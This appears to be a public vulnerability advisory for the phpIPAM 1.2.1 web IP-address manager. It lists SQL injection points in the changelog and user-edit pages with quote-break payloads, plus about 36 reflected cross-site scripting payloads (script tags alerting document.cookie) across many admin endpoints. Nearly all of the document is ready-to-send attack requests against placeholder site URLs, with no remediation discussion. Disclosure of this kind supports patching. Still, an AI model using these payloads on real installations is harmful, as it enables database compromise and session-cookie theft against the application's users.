@@ -1,0 +1,187 @@
+PHPIPAM 1.2.1 Multiple Vulnerabilities
+ 
+Author: Saeed reza Zamanian [penetrationtest @ Linkedin]
+ 
+Product: 06 Sep 2016
+Tested Version: phpipam-1.2.1 (Latest Version - modified on 2016-02-13)
+Vendor: http://phpipam.net/
+Product URL: https://sourceforge.net/projects/phpipam/
+
+Date: 20 Mar 2016
+
+ 
+About Product: 
+---------------
+phpipam is an open-source web IP address management application (IPAM). Its goal is to provide light, modern and useful IP address management.
+It is php-based application with MySQL database backend, using jQuery libraries, ajax and some HTML5/CSS3 features.
+
+ 
+ 
+Vulnerability Report:
+----------------------
+SQL Injection Vulnerability (3 Items):
+on Tools>Changelog 
+[sPage] Parameter is vulnerable against SQLi.
+Method: GET
+Payload:
+http://[Site]/phpipam/?page=tools&section=changelog&subnetId=a&sPage=50' [SQLi]
+
+
+on http://[Site]/phpipam/app/tools/user-menu/user-edit.php
+[lang] and [printLimit] Parameters are vulnerable against SQLi.
+Payload:
+Method : POST
+PostData=
+real_name=phpIPAM+Admin&email=admin%40domain.local&password1=&password2=&mailNotify=No&mailChangelog=No&printLimit=30&lang=9'[SQLi]
+
+OR
+Method : POST
+http://[Site]/phpipam/app/tools/user-menu/user-edit.php
+PostData=
+real_name=phpIPAM+Admin&email=admin%40domain.local&password1=&password2=&lang=9&mailNotify=No&mailChangelog=No&printLimit=30'[SQLi]
+
+===============================================
+
+XSS Vulnerability (36 Items):
+Method: POST
+http://[Site]/phpipam/app/admin/languages/edit.php
+PostData:
+langid=2"><script>alert(document.cookie);</script>&action=edit
+
+http://[Site]/phpipam/app/admin/languages/edit.php
+PostData:
+langid=2&action=edit"><script>alert(document.cookie);</script>
+
+http://[Site]/phpipam/app/admin/widgets/edit.php
+PostData:
+wid=1"><SCRIPT>ALERT(DOCUMENT.COOKIE);</SCRIPT>&action=edit
+
+http://[Site]/phpipam/app/admin/widgets/edit.php
+PostData:
+wid=1&action=edit"><SCRIPT>ALERT(DOCUMENT.COOKIE);</SCRIPT>
+
+http://[Site]/phpipam/app/admin/scan-agents/edit.php
+PostData:
+id=1&action=edit"><SCRIPT>ALERT(DOCUMENT.COOKIE);</SCRIPT>
+
+http://[Site]/phpipam/app/admin/groups/edit-group.php
+PostData:
+id=2"><SCRIPT>ALERT(DOCUMENT.COOKIE);</SCRIPT>&action=edit
+
+http://[Site]/phpipam/app/admin/groups/edit-group.php
+PostData:
+id=2&action=edit"><SCRIPT>ALERT(DOCUMENT.COOKIE);</SCRIPT>
+
+http://[Site]/phpipam/app/admin/users/edit.php
+PostData:
+id=1&action=edit"><SCRIPT>ALERT(DOCUMENT.COOKIE);</SCRIPT>
+
+http://[Site]/phpipam/app/admin/tags/edit.php
+PostData:
+id=1&action=edit"><SCRIPT>ALERT(DOCUMENT.COOKIE);</SCRIPT>
+
+http://[Site]/phpipam/app/admin/instructions/preview.php
+PostData:
+instructions=You+can+write+instructions+under+admin+menu!"><SCRIPT>ALERT(DOCUMENT.COOKIE);</SCRIPT>
+
+http://[Site]/phpipam/app/admin/sections/edit.php
+PostData:
+sectionId=2"><SCRIPT>ALERT(DOCUMENT.COOKIE);</SCRIPT>&action=edit
+
+http://[Site]/phpipam/app/admin/sections/edit.php
+PostData:
+sectionId=2&action=edit"><SCRIPT>ALERT(DOCUMENT.COOKIE);</SCRIPT>
+
+http://[Site]/phpipam/app/admin/subnets/edit.php
+PostData:
+sectionId=2&subnetId=1"><SCRIPT>ALERT(DOCUMENT.COOKIE);</SCRIPT>&action=edit
+
+http://[Site]/phpipam/app/admin/subnets/edit.php
+PostData:
+sectionId=2&subnetId=1&action=edit"><SCRIPT>ALERT(DOCUMENT.COOKIE);</SCRIPT>
+
+http://[Site]/phpipam/app/admin/subnets/edit-folder.php
+PostData:
+sectionId=1&subnetId=5&action=edit"><SCRIPT>ALERT(DOCUMENT.COOKIE);</SCRIPT>&location=IPaddresses
+
+http://[Site]/phpipam/app/admin/devices/edit.php
+PostData:
+switchId=1&action=edit"><SCRIPT>ALERT(DOCUMENT.COOKIE);</SCRIPT>
+
+http://[Site]/phpipam/app/admin/device-types/edit.php
+PostData:
+tid=1&action=edit"><SCRIPT>ALERT(DOCUMENT.COOKIE);</SCRIPT>
+
+http://[Site]/phpipam/app/admin/vlans/edit.php
+PostData:
+vlanId=1"><SCRIPT>ALERT(DOCUMENT.COOKIE);</SCRIPT>&action=edit&vlanNum=
+
+http://[Site]/phpipam/app/admin/vlans/edit.php
+PostData:
+vlanId=1&action=edit"><SCRIPT>ALERT(DOCUMENT.COOKIE);</SCRIPT>&vlanNum=
+
+http://[Site]/phpipam/app/admin/vlans/edit.php
+PostData:
+vlanId=1&action=edit&vlanNum="><SCRIPT>ALERT(DOCUMENT.COOKIE);</SCRIPT>
+
+http://[Site]/phpipam/app/admin/vlans/edit-domain.php
+PostData:
+id="><SCRIPT>ALERT(DOCUMENT.COOKIE);</SCRIPT>&action=add
+
+http://[Site]/phpipam/app/admin/vlans/edit-domain.php
+PostData:
+id=&action=add"><SCRIPT>ALERT(DOCUMENT.COOKIE);</SCRIPT>
+
+http://[Site]/phpipam/app/admin/nameservers/edit.php
+PostData:
+nameserverId=1"><SCRIPT>ALERT(DOCUMENT.COOKIE);</SCRIPT>&action=edit
+
+http://[Site]/phpipam/app/admin/nameservers/edit.php
+PostData:
+nameserverId=1&action=edit"><SCRIPT>ALERT(DOCUMENT.COOKIE);</SCRIPT>
+
+http://[Site]/phpipam/app/admin/custom-fields/edit.php
+PostData:
+action=add"><SCRIPT>ALERT(DOCUMENT.COOKIE);</SCRIPT>&fieldName=&table=ipaddresses
+
+http://[Site]/phpipam/app/admin/custom-fields/edit.php
+PostData:
+action=add&fieldName=&table=ipaddresses"><SCRIPT>ALERT(DOCUMENT.COOKIE);</SCRIPT>
+
+http://[Site]/phpipam/app/admin/custom-fields/filter.php
+PostData:
+table=ipaddresses"><SCRIPT>ALERT(DOCUMENT.COOKIE);</SCRIPT>
+
+http://[Site]/phpipam/app/admin/replace-fields/result.php
+PostData:
+field=description"><SCRIPT>ALERT(DOCUMENT.COOKIE);</SCRIPT>&search=a&csrf_cookie=892d2a900ec7fc1ba9486ec171a36f71&replace=a
+
+http://[Site]/phpipam/app/admin/subnets/edit.php
+PostData:
+sectionId=1&subnetId=6&action=edit&location=IPaddresses"><SCRIPT>ALERT(DOCUMENT.COOKIE);</SCRIPT>
+
+
+http://[Site]/phpipam/app/admin/subnets/edit-folder.php
+PostData:
+sectionId=2&subnetId="><SCRIPT>ALERT(DOCUMENT.COOKIE);</SCRIPT>&action=add&location=IPaddresses
+
+http://[Site]/phpipam/app/tools/devices/devices-print.php
+PostData:
+ffield=hostname"><SCRIPT>ALERT(DOCUMENT.COOKIE);</SCRIPT>&fval=a&direction=hostname%7Casc
+
+http://[Site]/phpipam/app/tools/devices/devices-print.php
+PostData:
+ffield=hostname&fval=a"><SCRIPT>ALERT(DOCUMENT.COOKIE);</SCRIPT>&direction=hostname%7Casc
+
+http://[Site]/phpipam/app/tools/devices/devices-print.php
+PostData:
+ffield=hostname&fval=a&direction=hostname%7Casc"><SCRIPT>ALERT(DOCUMENT.COOKIE);</SCRIPT>
+
+http://[Site]/phpipam/app/tools/subnet-masks/popup.php
+PostData:
+closeClass=hidePopups"><SCRIPT>ALERT(DOCUMENT.COOKIE);</SCRIPT>
+
+Method: GET
+http://[Site]/phpipam/?page=tools&section=changelog&subnetId=a&sPage=50"><SCRIPT>ALERT(DOCUMENT.COOKIE);</SCRIPT>
+
+http://[Site]/phpipam/?page=tools&section=changelog&subnetId=a"><SCRIPT>ALERT(DOCUMENT.COOKIE);</SCRIPT>
